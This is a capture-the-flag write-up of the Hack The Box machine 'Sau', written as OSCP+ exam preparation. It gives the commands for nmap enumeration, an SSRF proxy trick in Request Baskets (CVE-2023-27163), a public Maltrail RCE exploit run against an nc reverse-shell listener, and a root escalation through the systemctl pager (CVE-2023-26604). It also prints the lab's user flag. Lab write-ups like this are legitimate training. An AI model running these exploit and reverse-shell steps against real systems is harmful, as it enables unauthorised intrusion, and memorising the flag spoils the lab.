---
layout: post
title:  HTB Sau Write-up
description: Part of the OSCP+ Preparation Series
date:   2024-11-14 09:00:00 +0300
image:  '/images/htb_sau.png'
tags:   [Write-ups, HTB, OSCP+, Linux, Easy, CVE]
---

# Table of Contents
- [Enumeration](#enumeration)
  - [Nmap](#nmap)
  - [Web Enumeration](#web-enumeration)
- [Foothold](#foothold)
  - [CVE-2023-27163 Request Baskets 1.2.1  to expose Target Local Port 80](#cve-2023-27163-request-baskets-121--to-expose-target-local-port-80)
  - [Maltrail RCE Exploit to get access as puma](#maltrail-rce-exploit-to-get-access-as-puma)
- [Privilege Escalation](#privilege-escalation)
  - [CVE-2023-26604 systemctl to escalate privileges](#cve-2023-26604-systemctl-to-escalate-privileges)

# Enumeration
### Nmap
```shell
# Step 1 - Find active ports
sudo nmap -p- -Pn --min-rate 10000 10.129.138.176

# Step 2 - Focus scan on the active ports found (Note: In this case is important to use -T4 to make the scan succeed)
sudo nmap -A -T4 -Pn -p22,80,8338,55555 10.129.138.176
```

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-14 01:58 EST
Nmap scan report for 10.129.138.176
Host is up (0.032s latency).

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Thu, 14 Nov 2024 06:59:01 GMT
|     Content-Length: 27
|     href="/web">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Allow: GET, OPTIONS
|     Date: Thu, 14 Nov 2024 06:59:01 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port55555-TCP:V=7.94SVN%I=7%D=11/14%Time=67359FB4%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,A2,"HTTP/1\.0\x20302\x20Found\r\nContent-Type:\x20text/ht
SF:ml;\x20charset=utf-8\r\nLocation:\x20/web\r\nDate:\x20Thu,\x2014\x20Nov
SF:\x202024\x2006:59:01\x20GMT\r\nContent-Length:\x2027\r\n\r\n<a\x20href=
SF:\"/web\">Found</a>\.\n\n")%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnectio
SF:n:\x20close\r\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,60,"HTTP/1\.0\
SF:x20200\x20OK\r\nAllow:\x20GET,\x20OPTIONS\r\nDate:\x20Thu,\x2014\x20Nov
SF:\x202024\x2006:59:01\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSPReq
SF:uest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
SF:est")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x2
SF:0text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad
SF:\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\
SF:r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.1\x20
SF:400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\
SF:r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessionReq,
SF:67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\
SF:x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")
SF:%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 55555/tcp)
HOP RTT    ADDRESS
1   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.79 seconds
```

The ports 80 and 8338 seem to be filtered, but we see the port 55555 as open.

### Web Enumeration

Lets enumerate port 55555 visiting it through the web browser:

```shell
http://10.129.138.176:55555
```

When visiting the website we get redirected to:

```shell
http://10.129.138.176:55555/web
```

We will do what we almost always do first, look at the bottom of the website:

```shell
Powered by request-baskets | Version: 1.2.1
```

Now we know that the page is running Request Baskets version 1.2.1

# Foothold
### CVE-2023-27163 Request Baskets 1.2.1  to expose Target Local Port 80

Searching on google we found that the version 1.2.1 of Request Baskets is vulnerable to CVE-2023-27163.

We can abuse this to enumerate the filtered port 80 from the target machine.

To do that, we can follow these steps:

```shell
# Click on Create, the value there doesnt matter 
http://10.129.138.176:55555/web

# Then click on
Open Basket

# Go to
Settings (Click on Gear icon at the top)

# Enter the following
Forward URL:
http://127.0.0.1:80

Activate check -> Proxy Response
Activate check -> Expand Forward Path

# Then click on
Apply

# Now visit the URL unter "Empty basket!"
http://10.129.138.176:55555/2ungbj8

# The page which is running locally at port 80 of the target, which we couldnt access externally, will open
```

If we scroll down on the exposed website, we will find the following:

```shell
Powered by Maltrail (v0.53)
```

### Maltrail RCE Exploit to get access as puma

If we google Maltrail 0.53 exploit, we will find the following RCE exploit:

https://github.com/spookier/Maltrail-v0.53-Exploit

Now lets use it and get access:

```shell
# Get the exploit
git clone https://github.com/spookier/Maltrail-v0.53-Exploit.git
cd Maltrail-v0.53-Exploit

# Start nc listener
nc -lvnp 8443

# Run the exploit (Notice that I entered as target URL the URL through which we accessed port 80)
python3 exploit.py 10.10.14.206 8443 http://10.129.138.176:55555/2ungbj8
```

Nice! We got access as puma:

```shell
listening on [any] 8443 ...
connect to [10.10.14.206] from (UNKNOWN) [10.129.138.176] 51028
$ whoami
whoami
puma
```

Update shell with:

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### User Flag
Now we can get the user.txt flag:

```shell
66675eeedd2b27f8bc12ca5b64779896
```

# Privilege Escalation

### CVE-2023-26604 systemctl to escalate privileges
Lets use sudo -l and see what we can get:

```shell
puma@sau:/opt/maltrail$ sudo -l
sudo -l
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

Checking the systemctl version we found out that the version is vulnerable to CVE-2023-26604:

```shell
systemctl --version
```

```bash
systemd 245 (245.4-4ubuntu3.22)
+PAM +AUDIT +SELINUX +IMA +APPARMOR +SMACK +SYSVINIT +UTMP +LIBCRYPTSETUP +GCRYPT +GNUTLS +ACL +XZ +LZ4 +SECCOMP +BLKID +ELFUTILS +KMOD +IDN2 -IDN +PCRE2 default-hierarchy=hybrid
```

Write "systemd 245 (245.4-4ubuntu3.22) cve" on google:

https://access.redhat.com/security/cve/cve-2023-26604

https://www.suse.com/security/cve/CVE-2023-26604.html

We can exploit it running it as sudo and then entering !/bin/bash after RETURN message:

```shell
puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service
sudo /usr/bin/systemctl status trail.service
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/bash
!//bbiinn//bbaasshh!/bin/bash
root@sau:/opt/maltrail# whoami
whoami
root
```

### Root Flag

Now we can get the root.txt flag:

```shell
cat /root/root.txt
```